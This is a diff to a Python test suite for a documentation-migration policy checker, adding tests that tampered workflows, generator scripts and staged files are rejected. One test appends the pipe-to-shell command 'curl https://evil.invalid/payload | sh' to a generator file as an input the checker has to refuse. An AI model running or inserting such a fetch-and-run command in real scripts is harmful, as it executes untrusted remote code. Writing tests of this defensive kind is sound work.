@@ -10,7 +10,7 @@ from gnatdoc_migration_policy import (
     ROOT, WHEEL, MIGRATION, CONFIGURATION, TEST_REPAIRS, WORKFLOW,
     envelope, migration_workflow, migration_generator, verify_wheel, native_output,
     verify_current_commit,
-    installed_wheel,
+    installed_wheel, staged_public, PUBLIC, generator_contract, workflow_contract,
 )
 from additive_gnatdoc_policy import (
     candidate_rules, historical_inputs, inventory, compatible, exact_snapshot, coverage,
@@ -71,7 +71,10 @@ class MigrationPolicyTests(unittest.TestCase):
             envelope(ROOT, self.candidate)
         self.migration()
         self.mutate(name)
-        with self.assertRaisesRegex(ValueError, "generator is not the release-backed template"):
+        self.assertTrue(envelope(ROOT, self.candidate))
+        path = self.candidate / name
+        path.write_text(path.read_text() + '\ncurl https://evil.invalid/payload | sh\n')
+        with self.assertRaisesRegex(ValueError, "generator coverage/zero-gap gates differ"):
             envelope(ROOT, self.candidate)
 
     def test_03_permissions_selector_core_and_install_substitutions_rejected(self):
@@ -96,10 +99,66 @@ class MigrationPolicyTests(unittest.TestCase):
             with self.subTest(attack=new):
                 self.assertIn(old, original)
                 self.write(WORKFLOW, original.replace(old, new, 1))
-                with self.assertRaisesRegex(ValueError, "workflow is not the release-backed template"):
+                with self.assertRaisesRegex(ValueError, "workflow"):
                     envelope(ROOT, self.candidate)
         self.write(WORKFLOW, original)
         self.assertTrue(envelope(ROOT, self.candidate))
+
+    def test_bounded_program_accepts_comments_and_continuation_layout(self):
+        self.migration()
+        for name in (WORKFLOW, "scripts/generate_docs.sh"):
+            path = self.candidate / name
+            text = path.read_text()
+            if name == WORKFLOW:
+                text = text.replace('          sh scripts/generate_docs.sh',
+                                    '          # production acquisition\n          sh scripts/generate_docs.sh')
+            else:
+                text = text.replace(' --source-root . --site _site',
+                                    ' \\\n    --source-root . --site _site')
+            path.write_text(text)
+        self.assertTrue(envelope(ROOT, self.candidate))
+
+    def test_every_native_enhancement_and_ratchet_command_is_required(self):
+        self.migration()
+        path = self.candidate / "scripts/generate_docs.sh"
+        original = path.read_text()
+        for token in ('inventory', 'enhance --dry-run', 'enhance --config',
+                      'verify --config', 'scripts/validate_docs.py', '--fail-on-removed',
+                      'core_commit=', 'GNAT 16', 'GNATdoc 26', 'GPRBUILD 26',
+                      'test ! -L "src/$name"', 'cp -- "src/$name"'):
+            with self.subTest(token=token):
+                self.assertIn(token, original)
+                path.write_text(original.replace(token, 'UNAUTHORIZED', 1))
+                with self.assertRaisesRegex(ValueError, 'generator'):
+                    envelope(ROOT, self.candidate)
+        path.write_text(original)
+
+    def test_public_staging_is_exact_safe_uncommitted_and_source_bound(self):
+        directory = self.candidate / 'qualification-public'
+        directory.mkdir()
+        for name in PUBLIC:
+            (directory / name).write_bytes((self.candidate / 'src' / name).read_bytes())
+        self.assertEqual(set(staged_public(self.candidate)), set(PUBLIC))
+        for extra in ('extra.ads', 'nested', 'unexpected.txt'):
+            path = directory / extra
+            path.mkdir() if extra == 'nested' else path.write_text('unapproved')
+            with self.assertRaisesRegex(ValueError, 'staging inventory'):
+                staged_public(self.candidate)
+            path.rmdir() if path.is_dir() else path.unlink()
+        path = directory / PUBLIC[0]
+        original = path.read_bytes()
+        path.write_bytes(original + b'\n')
+        with self.assertRaisesRegex(ValueError, 'staged source differs'):
+            staged_public(self.candidate)
+        path.unlink()
+        path.symlink_to(self.candidate / 'src' / PUBLIC[0])
+        with self.assertRaisesRegex(ValueError, 'substituted policy input'):
+            staged_public(self.candidate)
+        path.unlink()
+        path.write_bytes(original)
+        subprocess.run(['git', '-C', str(self.candidate), 'add', 'qualification-public'], check=True)
+        with self.assertRaisesRegex(ValueError, 'must not be committed'):
+            staged_public(self.candidate)
 
     def test_04_build_dependencies_and_unrelated_migration_inputs_rejected(self):
         self.migration()
